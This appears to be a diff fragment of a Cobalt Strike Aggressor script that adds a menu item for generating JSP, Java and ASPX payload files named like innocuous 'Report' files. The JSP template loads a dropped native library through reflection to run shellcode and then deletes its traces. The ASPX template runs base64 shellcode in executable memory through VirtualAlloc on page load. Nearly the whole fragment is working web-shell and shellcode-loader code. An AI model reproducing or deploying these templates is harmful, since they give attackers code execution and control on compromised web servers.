+        $data = $data . "    private static final byte[] COMMAND_CLASS_BYTES = new byte[] {-54,-2,-70,-66,0,0,0,49,0,15,10,0,3,0,12,7,0,13,7,0,14,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,4,107,105,108,108,1,0,5,40,91,66,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,11,75,105,108,108,101,114,46,106,97,118,97,12,0,4,0,5,1,0,6,75,105,108,108,101,114,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,0,33,0,2,0,3,0,0,0,0,0,2,0,1,0,4,0,5,0,1,0,6,0,0,0,29,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,1,0,7,0,0,0,6,0,1,0,0,0,1,1,1,0,8,0,9,0,0,0,1,0,10,0,0,0,2,0,11};\r\n";
+        $data = $data . "%>\r\n";
+        $data = $data . "<%\r\n";
+        $data = $data . "    java.lang.StringBuilder b64 = new java.lang.StringBuilder();\r\n";
+        $length = strlen($b64payload);
+        $index = 0;
+        while($length > $index){
+            $data = $data . "b64.append(\"". substr($b64payload, $index, $index + 1000) ."\");\n";
+            $index = $index + 1000;
+        }
+        $data = $data . "    byte[] shell = decode(b64.toString());\r\n";
+        $data = $data . "    String jniBytes = null;\r\n";
+        $data = $data . "    String COMMAND_JNI_FILE_BYTES = \"" . $b64Dll . "\";\r\n";
+        $data = $data . "\r\n";
+        $data = $data . "    java.io.File library = java.io.File.createTempFile(\"apache10192\", \".cache\");\r\n";
+        $data = $data . "        java.lang.ClassLoader loader = null;\r\n";
+        $data = $data . "        if (loader == null) {\r\n";
+        $data = $data . "            loader = new java.lang.ClassLoader(this.getClass().getClassLoader()) {\r\n";
+        $data = $data . "                @Override\r\n";
+        $data = $data . "                protected Class<?> findClass(String name) throws ClassNotFoundException {\r\n";
+        $data = $data . "                    try {\r\n";
+        $data = $data . "                        return super.findClass(name);\r\n";
+        $data = $data . "                    } catch (ClassNotFoundException e) {\r\n";
+        $data = $data . "                        return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);\r\n";
+        $data = $data . "                    }\r\n";
+        $data = $data . "                }\r\n";
+        $data = $data . "            };\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "        byte[] data = decode(COMMAND_JNI_FILE_BYTES);\r\n";
+        $data = $data . "        java.io.FileOutputStream output = new java.io.FileOutputStream(library,false);\r\n";
+        $data = $data . "        output.write(data, 0, data.length);\r\n";
+        $data = $data . "        output.close();\r\n";
+        $data = $data . "        try {\r\n";
+        $data = $data . "            java.lang.Class  commandClass = loader.loadClass(\"Killer\");\r\n";
+        $data = $data . "            Object loadLib      = null;\r\n";
+        $data = $data . "            if (loadLib == null || !((Boolean) loadLib)) {\r\n";
+        $data = $data . "                java.lang.reflect.Method loadLibrary0Method = java.lang.ClassLoader.class.getDeclaredMethod(\"loadLibrary0\", Class.class, java.io.File.class);\r\n";
+        $data = $data . "                loadLibrary0Method.setAccessible(true);\r\n";
+        $data = $data . "                loadLibrary0Method.invoke(loader, commandClass, library);\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "            java.lang.reflect.Constructor constructor = commandClass.getDeclaredConstructor();\r\n";
+        $data = $data . "            Object instance = constructor.newInstance();\r\n";
+        $data = $data . "            commandClass.getMethod(\"kill\", byte[].class).invoke(instance, shell);\r\n";
+        $data = $data . "        } catch (Exception e) {\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "        try{\r\n";
+        $data = $data . "            java.lang.reflect.Field field = java.lang.ClassLoader.class.getDeclaredField(\"nativeLibraries\");\r\n";
+        $data = $data . "            field.setAccessible(true);\r\n";
+        $data = $data . "            java.util.Vector<Object> libraryVictor = (java.util.Vector<Object>)field.get(loader);\r\n";
+        $data = $data . "            for(Object obj : libraryVictor){\r\n";
+        $data = $data . "                Class clazz = obj.getClass();\r\n";
+        $data = $data . "                java.lang.reflect.Field nameField = clazz.getDeclaredField(\"name\");\r\n";
+        $data = $data . "                nameField.setAccessible(true);\r\n";
+        $data = $data . "                String jniName = (String)nameField.get(obj);\r\n";
+        $data = $data . "                if(jniName.contains(\"apache10192\")){\r\n";
+        $data = $data . "                    java.lang.reflect.Method method = clazz.getDeclaredMethod(\"finalize\");\r\n";
+        $data = $data . "                    method.setAccessible(true);\r\n";
+        $data = $data . "                    method.invoke(obj);\r\n";
+        $data = $data . "                    if(library.exists()){\r\n";
+        $data = $data . "                        library.delete();\r\n";
+        $data = $data . "                    }\r\n";
+        $data = $data . "                }\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "        }catch(Exception e){\r\n";
+        $data = $data . "            e.printStackTrace();\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "%>\r\n";
+    }else if((%options["type"] eq "ASPX")){
+        $data = $data . "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" Inherits=\"System.Web.UI.Page\" %>\r\n";
+        $data = $data . "<%@ Import Namespace=\"System\" %>\r\n";
+        $data = $data . "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\r\n";
+        $data = $data . "<script Language=\"c#\" runat=\"server\">\r\n";
+        $data = $data . "    delegate int Proc();\r\n";
+        $data = $data . "    protected void Page_Load(object sender, EventArgs e)\r\n";
+        $data = $data . "    {byte[] codeBytes = Convert.FromBase64String(\"" . $b64payload . "\");\r\n";
+        $data = $data . "        IntPtr handle = IntPtr.Zero;\r\n";
+        $data = $data . "        handle = VirtualAlloc(IntPtr.Zero,codeBytes.Length, 0x1000 | 0x2000, 0x40);\r\n";
+        $data = $data . "        try{Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);\r\n";
+        $data = $data . "            Proc proc = Marshal.GetDelegateForFunctionPointer(handle, typeof(Proc)) as Proc;proc();}\r\n";
+        $data = $data . "        finally{VirtualFree(handle, 0, 0x8000);}}\r\n";
+        $data = $data . "    [DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualAlloc\")]\r\n";
+        $data = $data . "    public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);\r\n";
+        $data = $data . "    [DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualFree\")]\r\n";
+        $data = $data . "    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);\r\n";
+        $data = $data . "</script>\r\n";
+    }
+    if((%options["type"] eq "JAVA")){
+        prompt_file_save("Report.java", {
+            local('$handle');
+            $handle = openf("> $+ $1");
+            writeb($handle, $data);
+            closef($handle);
+        });
+    }else if((%options["type"] eq "JSP")){
+        println("jsp mode");
+        prompt_file_save("Report.jsp", {
+            local('$handle');
+            $handle = openf("> $+ $1");
+            writeb($handle, $data);
+            closef($handle);
+        });
+    }else if((%options["type"] eq "ASPX")){
+        println("aspx mode");
+        prompt_file_save("Report.aspx", {
+            local('$handle');
+            $handle = openf("> $+ $1");
+            writeb($handle, $data);
+            closef($handle);
+        });
+    }
+}
+
+popup attacks{
+    
+    item "JAVA/JSP/ASPX Payload" {
+        local('$dialog %defaults');
+
+        %defaults["stageless"] = "false";
+    
+
+        # create our dialog
+        $dialog = dialog("Generate JAVA/ASPX Payload v1.2", %defaults, &setup_attack);
+        dialog_description($dialog, "Generate a JAVA/ASPX Payload");
+        drow_listener_stage($dialog, "listener", "Listener: ");
+        drow_checkbox($dialog, "stageless", "Stageless:", "Use Stageless Payload");
+        drow_combobox($dialog, "type", "Type: ", @("JAVA","JSP" ,"ASPX"));
+        dbutton_action($dialog, "Launch");
+
+        # show our dialog
+        dialog_show($dialog);
+    }
+}
